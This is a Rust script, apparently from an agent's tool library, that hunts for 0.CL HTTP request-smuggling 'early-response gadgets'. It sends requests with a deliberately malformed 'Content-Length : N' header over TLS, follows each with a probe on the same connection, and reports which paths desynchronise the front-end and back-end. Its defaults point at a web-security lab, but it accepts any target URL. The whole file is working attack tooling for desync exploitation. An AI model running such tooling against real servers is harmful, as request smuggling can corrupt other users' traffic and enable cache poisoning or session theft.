#!/usr/bin/env rust-script
//! name: earlygad
//! description: 0.CL early-response gadget finder - for each candidate path it sends `GET <path> HTTP/1.1` with a malformed `Content-Length : N` header (space before the colon: ignored by the front-end, honoured by the back-end) and NO body, then immediately sends a second, clean probe request on the SAME client connection. If the candidate path is answered by the back-end before it reads the body (a true early-response gadget), the front-end pools the now-idle upstream connection and the second request's leading bytes get eaten as the first request's body, so the probe response comes back mangled; if the path is served by the front-end (or the back-end refuses to answer before the body) the probe response is clean. Reports the probe baseline, each candidate's first/second response status+length and a mangled flag, so the one usable gadget is picked by measurement instead of assumption.
//! version: 1.0.0
//! args: <base-url> [--paths p1,p2,...] [--cl N] [--probe PATH] [--first-ms N] [--second-ms N] [--host H] [--selftest]
//! keywords: smuggling, 0cl, desync, gadget, early-response, cl0, finder, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

/// status lines + content-length values found in a raw stream
fn classify(buf: &[u8]) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    let mut lens: Vec<u64> = Vec::new();
    for (off, _) in text.to_ascii_lowercase().match_indices("content-length: ") {
        let rest = &text[off + 16..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        if let Ok(v) = rest[..end].trim().parse::<u64>() {
            lens.push(v);
        }
    }
    json!({"statuses": statuses, "content_lengths": lens, "bytes": buf.len(),
           "head": text.chars().take(70).collect::<String>()})
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let v = classify(b"HTTP/1.1 200 OK\r\nContent-Length: 7365\r\n\r\nxHTTP/1.1 400 Bad Request\r\nContent-Length: 174\r\n\r\n");
        let ok = v["statuses"].as_array().map(|a| a.len()).unwrap_or(0) == 2
            && v["content_lengths"].as_array().map(|a| a.len()).unwrap_or(0) == 2;
        pi_rust_lib::report::success("earlygad", json!({"selftest": if ok {"ok"} else {"fail"}, "v": v}), "classifier is the pure root").unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("earlygad", "usage", "call as: earlygad <base-url> [--paths a,b,c] [--cl 10] [--probe '/post?postId=2']");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let cl: u64 = arg_val(&argv, "--cl").and_then(|v| v.parse().ok()).unwrap_or(10);
    let probe = arg_val(&argv, "--probe").unwrap_or_else(|| "/post?postId=2".to_string());
    let first_ms: u64 = arg_val(&argv, "--first-ms").and_then(|v| v.parse().ok()).unwrap_or(1500);
    let second_ms: u64 = arg_val(&argv, "--second-ms").and_then(|v| v.parse().ok()).unwrap_or(2500);
    let paths: Vec<String> = arg_val(&argv, "--paths")
        .unwrap_or_else(|| "/resources/images/blog.svg,/image/blog/posts/28.jpg,/resources/css/labsBlog.css,/favicon.ico,/robots.txt".to_string())
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    // baseline probe
    let baseline = (|| -> Result<Value, String> {
        let mut c = connect(&host, port)?;
        let req = format!("GET {probe} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
        c.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
        let _ = c.flush();
        Ok(classify(&drain(&mut c, 3000, 400)))
    })();

    let mut rows: Vec<Value> = Vec::new();
    let mut mangled_paths: Vec<String> = Vec::new();
    let mut last_err = String::new();
    for p in &paths {
        timeout::check();
        let mut row = json!({"path": p});
        match connect(&host, port) {
            Ok(mut c) => {
                let r1 = format!("GET {p} HTTP/1.1\r\nHost: {host}\r\nContent-Length : {cl}\r\nConnection: keep-alive\r\n\r\n");
                if c.write_all(r1.as_bytes()).is_err() {
                    last_err = "r1 write".to_string();
                } else {
                    let _ = c.flush();
                    let b1 = drain(&mut c, first_ms, 300);
                    row["r1"] = classify(&b1);
                    let r2 = format!("GET {probe} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n");
                    if c.write_all(r2.as_bytes()).is_err() {
                        last_err = "r2 write".to_string();
                    } else {
                        let _ = c.flush();
                        let b2 = drain(&mut c, second_ms, 400);
                        let c2 = classify(&b2);
                        let bad = c2["statuses"]
                            .as_array()
                            .map(|a| a.iter().any(|s| s.as_str().map(|x| !x.contains(" 200 ")).unwrap_or(false)))
                            .unwrap_or(false);
                        let clean_len = c2["content_lengths"].as_array().and_then(|a| a.first()).and_then(|v| v.as_u64());
                        let base_len = baseline.as_ref().ok().and_then(|b| b["content_lengths"].as_array()).and_then(|a| a.first()).and_then(|v| v.as_u64());
                        let len_diff = match (clean_len, base_len) {
                            (Some(a), Some(b)) => (a as i64 - b as i64).abs(),
                            _ => -1,
                        };
                        let mangled = bad || len_diff > 150 || c2["statuses"].as_array().map(|a| a.is_empty()).unwrap_or(true);
                        row["r2"] = c2;
                        row["mangled"] = json!(mangled);
                        if mangled {
                            mangled_paths.push(p.clone());
                        }
                    }
                }
            }
            Err(e) => last_err = e,
        }
        rows.push(row);
    }

    pi_rust_lib::report::success(
        "earlygad",
        json!({
            "url": base,
            "host": host,
            "probe": probe,
            "baseline": baseline.ok(),
            "hidden_cl": cl,
            "mangled_paths": mangled_paths,
            "rows": rows,
            "last_error": last_err,
        }),
        "a mangled_paths entry names a path whose request the back-end answered before reading the body - use it as the 0.CL early-response gadget",
    )
    .unwrap_or(());
}
